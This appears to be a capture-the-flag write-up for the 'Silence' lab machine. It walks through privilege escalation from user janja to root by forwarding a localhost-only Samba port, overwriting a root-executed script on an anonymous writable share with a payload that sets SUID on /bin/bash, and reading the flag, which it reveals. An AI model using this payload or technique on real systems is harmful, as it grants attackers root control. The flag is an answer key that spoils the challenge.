# Silence 2 — Privilege Escalation

> Continues from **Silence #1** (`silence-1-user.md`). Starting point: already logged in as `janja`.

## Techniques used

- Local port enumeration
- SSH local port forwarding
- SMB share writable by anonymous
- SUID bash escalation

## Tools used

- ss
- ssh
- smbclient

## Commands and output

### 1. Finding a locally-bound service

```bash
$ ss -tlnp
```

```text
LISTEN  127.0.0.1:445   (Samba, not exposed externally)
```

### 2. Forwarding the port and enumerating shares

```bash
$ ssh -f -L 4445:127.0.0.1:445 janja@10.10.0.52 -N
$ smbclient -L //127.0.0.1 -N -p 4445
```

```text
Sharename       Type
Adam home dir   Disk
```

### 3. Listing Adam's home directory via SMB

```bash
$ smbclient "//127.0.0.1/Adam home dir" -N -p 4445 -c 'ls'
```

```text
checklist.sh    N    339
```

### 4. Reading checklist.sh

```bash
$ smbclient "//127.0.0.1/Adam home dir" -N -p 4445 -c 'get checklist.sh'
$ cat checklist.sh
```

```text
ls -alh /home/adam
finger
chmod 744 /home/adam/checklist.sh
```

### 5. Overwriting the script via the writable share

```bash
$ cat > checklist.sh << 'EOF'
#!/bin/bash
chmod u+s /bin/bash
EOF
$ smbclient "//127.0.0.1/Adam home dir" -N -p 4445 -c 'put checklist.sh checklist.sh'
```

### 6. Escalating

```bash
$ ls -la /bin/bash
```

```text
-rwsr-xr-x 1 root root 1298416 May  9 11:07 /bin/bash
```

```bash
$ bash -p
$ id
```

```text
uid=1002(janja) gid=1002(janja) euid=0(root) groups=1002(janja)
```

### 7. Reading root.txt

```bash
$ cat /root/root.txt
```

```text
EPI{4D4m_0nDr4_51L3nC3_7H3_h4RD357_r0u73_3V3r_9c}
```

## Evidence

- Flag: `EPI{4D4m_0nDr4_51L3nC3_7H3_h4RD357_r0u73_3V3r_9c}`
